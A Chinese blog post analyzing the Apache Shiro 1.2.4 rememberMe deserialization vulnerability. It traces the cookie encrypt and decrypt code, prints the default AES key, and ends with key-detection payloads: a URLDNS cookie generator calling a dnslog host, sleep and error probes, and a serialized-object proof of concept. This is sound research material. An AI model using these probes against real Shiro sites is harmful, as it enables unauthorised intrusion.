---
title: "Shiro RememberMe"
date: 2020-10-17T16:03:03+08:00
draft: false
tags: [Shiro]
categories: [Java]
comment: true
---
Shiro-RememberMe反序列化研究
<!--more-->

# Shiro rememberMe反序列化研究

## 环境搭建

- 环境搭建

```git
git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.2.4
mvn install
```

- shiro/samples/web添加

```xml
<!--  需要设置编译的版本 -->  
    <properties>
       <maven.compiler.source>1.8</maven.compiler.source>
       <maven.compiler.target>1.8</maven.compiler.target>
   </properties>

   <dependencies>
       <dependency>
           <groupId>javax.servlet</groupId>
           <artifactId>jstl</artifactId>
           <!--  这里需要将jstl设置为1.2 -->
           <version>1.2</version> 
           <scope>runtime</scope>
       </dependency>

       <dependency>
           <groupId>org.apache.commons</groupId>
           <artifactId>commons-collections4</artifactId>
           <version>4.0</version>
       </dependency>
<dependencies>
```


- .m2/toolchains.xml

```
<?xml version="1.0" encoding="UTF-8"?>

<toolchains xmlns="http://maven.apache.org/TOOLCHAINS/1.1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd">

<!--插入下面代码-->
  <toolchain>
    <type>jdk</type>
    <provides>
      <version>1.6</version>
      <vendor>sun</vendor>
    </provides>
    <configuration>
        <!--这里是你安装jdk的文件目录-->
      <jdkHome>/Library/Java/JavaVirtualMachines/1.6.0.jdk/</jdkHome>
    </configuration>
  </toolchain>
</toolchains>
```

- IDEA导入Maven->Package访问

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201015213853.png)

- - Shiro的识别

一般在请求头中添加rememberMe=xxx，看返回包是否有Set-Cookie: rememberMe=deleteMe，如果存在，则证明为Shiro

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016180813.png)


- shiro_tool复现

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016091452.png)

## 漏洞分析
### 加密过程
- org/apache/shiro/mgt/AbstractRememberMeManager.java:291进行断点

**点击登陆debug，发现用户名存在于token当中，为输入的root**
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016093609.png)

代码首先会经过`forgetIdentity(subject);`对变量subject进行处理，跟进forgetIdentity方法。

- org/apache/shiro/web/mgt/CookieRememberMeManager.java:256

**跟进forgetIdentity方法**

```
 private void forgetIdentity(HttpServletRequest request, HttpServletResponse response) {
        getCookie().removeFrom(request, response);
    }
```

**跟进removeFrom方法，removeFrom方法中在Cookie中添加了一些属性**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016095152.png)

- 回到onSuccessfulLogin方法中

```
if (isRememberMe(token))
```

用来判断是否设置了RememberMe选项，于debug中可以看到为true

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016101106.png)

getIdentityToRemember方法获取到我们登陆的用户root并返回，进入rememberIdentity方法

- org/apache/shiro/mgt/AbstractRememberMeManager.java:345

```
 protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
        byte[] bytes = convertPrincipalsToBytes(accountPrincipals);
        rememberSerializedIdentity(subject, bytes);
    }
```

将root传入convertPrincipalsToBytes方法，进入convertPrincipalsToBytes方法

- org/apache/shiro/mgt/AbstractRememberMeManager.java:359

```
 protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
        byte[] bytes = serialize(principals);//序列化principals
        if (getCipherService() != null) {
            bytes = encrypt(bytes);
        }
        return bytes;
    }
```

调用encrypt方法对bytes进行加密

- org/apache/shiro/mgt/AbstractRememberMeManager.java:469

```
 protected byte[] encrypt(byte[] serialized) {
        byte[] value = serialized;
        CipherService cipherService = getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());
            value = byteSource.getBytes();
        }
        return value;
    }
```

调用cipherService.encrypt方法对序列化的内容进行加密

**查看cipherService发现加密类型为g**`AES/CBC/PKCS5Paddin`
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016102723.png)

**getDecryptionCipherKey()为获取key，在文件开头定义了key值**

```
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

**跟进encrypt方法**
- org/apache/shiro/crypto/JcaCipherService.java:303

```
 public ByteSource encrypt(byte[] plaintext, byte[] key) {
        byte[] ivBytes = null;
        boolean generate = isGenerateInitializationVectors(false);
        if (generate) {
            ivBytes = generateInitializationVector(false);
            if (ivBytes == null || ivBytes.length == 0) {
                throw new IllegalStateException("Initialization vector generation is enabled - generated vector" +
                        "cannot be null or empty.");
            }
        }
        return encrypt(plaintext, key, ivBytes, generate);
    }
```

将key和用户名带入加密方法加密然后返回

**进入rememberSerializedIdentity方法**

```
    //base 64 encode it and store as a cookie:
        String base64 = Base64.encodeToString(serialized);

        Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies
        Cookie cookie = new SimpleCookie(template);
        cookie.setValue(base64);
        cookie.saveTo(request, response);
```

会将传入的Aes加密后的内容base64加密并返回给Cookie


- 整理流程借用L1NK3R师傅的一张图

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016104534.png)

### 解密过程


- `org/apache/shiro/mgt/AbstractRememberMeManager.java:390`断点

```
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = getRememberedSerializedIdentity(subjectContext);
            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
            if (bytes != null && bytes.length > 0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }

        return principals;
    }
```

跟进getRememberedSerializedIdentity方法

- org/apache/shiro/web/mgt/CookieRememberMeManager.java:185

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016122231.png)

**查看readValue方法,方法获取到cookie的值并返回**

```
public String readValue(HttpServletRequest request, HttpServletResponse ignored) {
        String name = getName();
        String value = null;
        javax.servlet.http.Cookie cookie = getCookie(request, name);
        if (cookie != null) {
            value = cookie.getValue();
            log.debug("Found '{}' cookie value [{}]", name, value);
        } else {
            log.trace("No '{}' cookie value", name);
        }

        return value;
    }
```

 **返回getRememberedSerializedIdentity方法**
 
 ```
 if (base64 != null) {
            base64 = ensurePadding(base64);
            if (log.isTraceEnabled()) {
                log.trace("Acquired Base64 encoded identity [" + base64 + "]");
            }
            byte[] decoded = Base64.decode(base64);
            if (log.isTraceEnabled()) {
                log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
            }
            return decoded;
        } else {
            //no cookie set - new site visitor?
            return null;
        }
 ```
 
 
 这里就获取到了base64解密之后的Cookie二进制,回到getRememberedPrincipals方法
 
 
 - 跟进`org/apache/shiro/mgt/AbstractRememberMeManager.java:427`

 ```
  protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);
        }
        return deserialize(bytes);
    }
 ```
 
 - 进入decrypt方法

 ```
     protected byte[] decrypt(byte[] encrypted) {
        byte[] serialized = encrypted;
        CipherService cipherService = getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
            serialized = byteSource.getBytes();
        }
        return serialized;
    }
 ```
 
 **Java序列化头部**
 ![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016124357.png)
 
 - 回到convertBytesToPrincipals方法

 这里调用了deserialize处理上一步解密的结果
 
 - 跟进`org/apache/shiro/io/DefaultSerializer.java:67`

**readObject方法**
 ![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016124819.png)

 
 - 流程图

 ![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016124958.png)
 
## Shiro key的获取方式

### URLDNS

```
import ysoserial.payloads.URLDNS;

public class ShiroKey {
    public static void main(String[] args) throws Exception {
        URLDNS urldns = new URLDNS();
        Object object = urldns.getObject("http://oq287o.dnslog.cn");
        byte[] buf = Serializables.serialize(object);

        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
        System.out.println(rememberMe);
    }
}
```

### 延时

```
try{ 
	if(!(System.getProperty("os.name").toLowerCase().contains("win"))){ 
		Thread.currentThread().sleep(10000L); 
		} 
	} catch(Exception e){}
```

### 报错

```
String result = "shiro-Vul-Discover";
throw new NoClassDefFoundError(new String(result));
```

### Shiro本身逻辑获取

- 核心代码

```
    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = getRememberedSerializedIdentity(subjectContext);
            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
            if (bytes != null && bytes.length > 0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }

        return principals;
    }
```

#### Key错误情况

```
principals = onRememberedPrincipalFailure(re, subjectContext);
```

- 跟进`org/apache/shiro/mgt/AbstractRememberMeManager.java:427`

```
 protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);
        }
        return deserialize(bytes);
    }
```

- 跟进`org/apache/shiro/mgt/AbstractRememberMeManager.java:485`


使用`cipherService.decrypt(encrypted, getDecryptionCipherKey());`进行处理，跟进去

因为key错误所以解不出来，回到最初的getRememberedPrincipals方法

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016214613.png)

- 跟进`org/apache/shiro/web/servlet/SimpleCookie.java:344`

```
   public void removeFrom(HttpServletRequest request, HttpServletResponse response) {
        String name = getName();
        String value = DELETED_COOKIE_VALUE;
        String comment = null; //don't need to add extra size to the response - comments are irrelevant for deletions
        String domain = getDomain();
        String path = calculatePath(request);
        int maxAge = 0; //always zero for deletion
        int version = getVersion();
        boolean secure = isSecure();
        boolean httpOnly = false; //no need to add the extra text, plus the value 'deleteMe' is not sensitive at all

        addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);
```

因为解密失败，最后设置cookie值为deleteMe

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016214925.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016215122.png)

#### Key正确情况

- deserialize方法

```
protected PrincipalCollection deserialize(byte[] serializedIdentity) {
    return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity);
}
```
反序列化时强制转换为PrincipalCollection类型,因为类型不符，会产生异常并且返回到核心函数

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201017012432.png)

- 产生异常，又回到getRememberedPrincipals方法

```
} catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }
```

接下来的逻辑和上面key错误的就一样了

- 构造条件

1、构造一个继承 PrincipalCollection 的序列化对象。
2、key正确情况下不返回 deleteMe ，key错误情况下返回 deleteMe 

- SimplePrincipalCollection

SimplePrincipalCollection类继承了PrincipalCollection

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20201016225441.png)

- 构造poc

```
SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream("payload"));
        obj.writeObject(simplePrincipalCollection);
        obj.close();
```
